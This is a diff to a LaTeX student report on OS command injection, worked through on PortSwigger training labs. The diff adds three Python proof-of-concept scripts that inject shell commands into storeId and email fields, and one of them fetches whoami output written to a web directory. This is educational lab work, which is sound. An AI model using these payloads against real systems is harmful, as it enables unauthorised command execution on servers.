@@ -62,8 +62,8 @@
 \maketitle
 
 \noindent\begin{tabular}{@{}ll}
-  Student & Jeongmin Lee\\
-  Contributor & \textit{Jongheok Kim, Chanhang Lee, Nurnazihah Intan, VIDAL VILLALBA PEDRO}\\
+  Student & \textit{Jeongmin Lee}\\
+  Contributor & \textit{Jonghyeok Lee, Chanhang Lee, Nurnazihah Intan, Pedro Vidal Villalba}\\
 \end{tabular}
 
 \section*{Introduction}
@@ -192,6 +192,7 @@ The key to preventing command injection vulnerabilities is to \textbf{avoid dire
 I conducted hands-on exercises on command injection attacks using the labs at \url{https://portswigger.net/web-security/all-labs#os-command-injection}.
 
 During the exercises, I added further explanations for aspects not covered above.
+Additionally, I have included two versions of the solutions for the exercises: one using a Python script and the other using Burp Suite.
 
 \subsection*{Lab: OS command injection, simple case}
 \begin{description}
@@ -222,7 +223,7 @@ During the exercises, I added further explanations for aspects not covered above
           \hline
           	; & Command separator; executes commands sequentially. & Always; independent of the previous command's success. & \texttt{echo a; echo b} — prints a then b \\
           	\&\& & Conditional AND: executes the following command only if the preceding command succeeded. & When the previous command's exit code == 0. & \texttt{make \&\& echo "build succeeded"} \\
-          	|| & Conditional OR: executes the following command only if the preceding command failed. & When the previous command's exit code != 0. & \texttt{grep foo file || echo "not found"} \\
+          	\textbar \textbar & Conditional OR: executes the following command only if the preceding command failed. & When the previous command's exit code != 0. & \texttt{grep foo file || echo "not found"} \\
           	\textbar & Pipe: connects stdout of the left command to stdin of the right command. & Always (processes are connected and run concurrently). & \texttt{ps aux \textbar\ grep ssh} — pipe the output to grep \\
           	\& & Background execution (asynchronous). & Command runs in background; prompt returns immediately. & \texttt{long\_task \&} — returns a PID \\
           \hline
@@ -247,7 +248,7 @@ During the exercises, I added further explanations for aspects not covered above
       \end{tabular}
     \end{center}
 
-    \item[\textbf{Solution}:] \leavevmode\par
+    \item[\textbf{Solution using Burpsuite}:] \leavevmode\par
     Because the attack requires sending commands to the server, the relevant HTTP request in this lab is the POST request. Intercept the POST request using Burp Suite, inject the \texttt{whoami} payload, and forward the modified request to observe the result. The detailed procedure is as follows:
     \begin{enumerate}
       \item Launch Burp Suite and ensure the Proxy Intercept setting is ON.
@@ -292,6 +293,54 @@ During the exercises, I added further explanations for aspects not covered above
       \end{figure}
       
     \end{enumerate}
+
+    \item[\textbf{Solution using Python script}:] \leavevmode\par
+    Below is a simple Python script that sends a command injection payload to the vulnerable web application's parameter (`storeId`) and checks for remote command execution. 
+    The key operations are as follows:
+
+    Key operations:
+    \begin{itemize}
+      \item Send a POST request to the \texttt{/product/stock} endpoint, injecting a payload of the form \texttt{'1 \&\& <command>'} into the \texttt{storeId} parameter.
+      \item Determine the success of the command execution based on the length of the response text (e.g., \texttt{len(r.text) > 3}).
+      \item Configure the \texttt{proxies} to use a local proxy (127.0.0.1:8080) to observe traffic with tools like Burp or mitmproxy.
+    \end{itemize}
+
+    \begin{lstlisting}[label={lst:modified-request},caption={Python script for problem 1}, showspaces=false,showstringspaces=false]
+    import requests
+    import sys
+    import urllib3
+
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    # Send the requests through Burp to be able to examine them
+    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+    def run_command(url: str, command: str):
+        stock_path = '/product/stock'
+        command_injection = '1 && ' + command
+        params = {'productId': '1', 'storeId': command_injection}
+        r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
+        if (len(r.text) > 3):
+            print(f"(+) Command injection succesful!")
+            print(f"(+) Output of command:\n{r.text}")
+        else:
+            print("(-) Command injection failed.")
+
+    def main():
+        # Check the number of arguments to the program is correct
+        if len(sys.argv) != 3:
+            print(f"(-) Usage: {sys.argv[0]} <url> <command>")
+            print(f"(-) Example: {sys.argv[0]} www.example.com whoami")
+            sys.exit(1)
+
+        url = sys.argv[1]
+        command = sys.argv[2]
+        print(f"(+) Exploiting command injection...")
+        run_command(url, command)
+
+    if __name__ == '__main__':
+        main()
+  \end{lstlisting}
 \end{description}
 
 \newpage
@@ -317,7 +366,7 @@ During the exercises, I added further explanations for aspects not covered above
       \item If the response time is approximately 10 seconds or more, it indicates that the command executed successfully.
     \end{itemize}
 
-    \item[\textbf{Solution}:] \leavevmode\par
+    \item[\textbf{Solution using Burpsuite}:] \leavevmode\par
 
     \begin{enumerate}
       \item Launch Burp Suite and ensure the Proxy Intercept setting is ON.
@@ -357,6 +406,58 @@ During the exercises, I added further explanations for aspects not covered above
       \end{figure}
 
     \end{enumerate}
+
+    \newpage
+    \item[\textbf{Solution using Python script}:] \leavevmode\par
+    The following Python script is a PoC that inserts a payload into the feedback form’s \texttt{email} field to induce a time delay, in order to verify whether the server interprets that input as a shell command (time-based command-injection).
+    The script first extracts the CSRF token from the feedback page, then sends a value containing the command ping -c 10 localhost and judges vulnerability based on the response delay (10 seconds).
+    All requests are configured to be sent through a local proxy (e.g., Burp Suite), allowing traffic analysis.
+
+    \begin{lstlisting}[label={lst:modified-request},caption={Python script for problem 2}, showspaces=false,showstringspaces=false]
+    import requests
+    import sys
+    import urllib3
+    from bs4 import BeautifulSoup
+
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }
+
+    def get_crsf(s, url):
+        feedback_path = "/feedback"
+        r = s.get(url + feedback_path, verify=False)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        csrf = soup.find('input')['value']
+        return csrf
+
+    def check_command_injection(s, url):
+        submit_feedback_path = "/feedback/submit"
+        command_injection = "test@test.com; ping -c 10 localhost #"
+        csrf_token = get_crsf(s, url)   # Retrieve CSRF in order to send a valid request
+        data = { 'csrf': csrf_token, 'name': "test", 'email': command_injection,
+                'subject': "testing", 'message': "This is a test"}
+        res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
+        if (res.elapsed.total_seconds() >= 10):
+            print("(+) Email field vulnerable to time-based command injection")
+        else:
+            print("(-) Email field not vulnerable to time-based command injection")
+
+    def main():
+        if len(sys.argv) != 2:
+            print(f"(-) Usage: {sys.argv[0]} <url>")
+            print(f"(-) Example: {sys.argv[0]} www.example.com")
+            sys.exit(1)
+
+        url = sys.argv[1]
+        print("(+) Checking if email parameter is vulnerable to time-based command injection...")
+
+        s = requests.Session()
+        check_command_injection(s, url)
+
+
+    if __name__ == '__main__':
+        main()
+  \end{lstlisting}
 
     \newpage
     \item[Additional analysis: Why only the Email field works while others do not]\leavevmode\par
@@ -423,7 +524,7 @@ During the exercises, I added further explanations for aspects not covered above
       \item Image URL retrieval: how to request an image resource from the web server.
     \end{itemize}
 
-  \item[\textbf{Solution}:] \leavevmode\par
+  \item[\textbf{Solution using Burpsuite}:] \leavevmode\par
     As in Lab 3, intercept the feedback submission request with Burp Suite and inject \texttt{whoami}. This time, redirect the command output to a file under \texttt{/var/www/images/} and retrieve that file via the image-serving endpoint. The procedure is as follows.
   \begin{enumerate}
     \item Intercept the feedback submission request with Burp Suite.
@@ -462,6 +563,64 @@ During the exercises, I added further explanations for aspects not covered above
       \end{figure}
 
   \end{enumerate}
+
+  \newpage
+  \item[\textbf{Solution using Python script}:] \leavevmode\par
+    The following Python script is a PoC that sends a payload to the feedback form's \texttt{email} field to execute the \texttt{whoami} command and redirect its output to \texttt{/var/www/images/output.txt}.
+    It then retrieves that file via the image URL to view the command output.
+
+    \begin{lstlisting}[label={lst:modified-request},caption={Python script for problem 3}, showspaces=false,showstringspaces=false]
+    import requests
+    import sys
+    import urllib3
+    from bs4 import BeautifulSoup
+
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }
+
+    # Get the CSRF in the /feedback page before exploiting the form vulnerability
+    def get_csrf(s, url):
+        feedback_path = "/feedback"
+        r = s.get(url + feedback_path, verify=False)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        csrf = soup.find('input')['value']
+        return csrf
+
+    def check_command_injection(s, url):
+        submit_feedback_path = "/feedback/submit"
+        command_injection = "test@test.com; whoami > /var/www/images/output-py.txt #"
+        csrf_token = get_csrf(s, url)   # Retrieve CSRF in order to send a valid request
+        data = { 'csrf': csrf_token, 'name': "test", 'email': command_injection,
+                'subject': "testing", 'message': "This is a test"}
+        res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
+        print("(+) Verifying if command injection exploit worked...")
+
+        # Verify command injection
+        file_path = "/image?filename=output-py.txt"
+        res = s.get(url + file_path, verify=False, proxies=proxies)
+        if (res.status_code == 200): # All good
+            print("(+) Command injection succesful!")
+            print(f"(+) The following is the content of the command: {res.text}")
+        else:
+            print("(-) Command injection was not succesful.")
+
+    def main():
+        if len(sys.argv) != 2:
+            print(f"(-) Usage: {sys.argv[0]} <url>")
+            print(f"(-) Example: {sys.argv[0]} www.example.com")
+            sys.exit(1)
+
+        url = sys.argv[1]
+        print("(+) Exploiting blind command injection in email field...")
+
+        s = requests.Session()
+        check_command_injection(s, url)
+
+
+    if __name__ == '__main__':
+        main()
+    \end{lstlisting}
 
 \end{description}
 
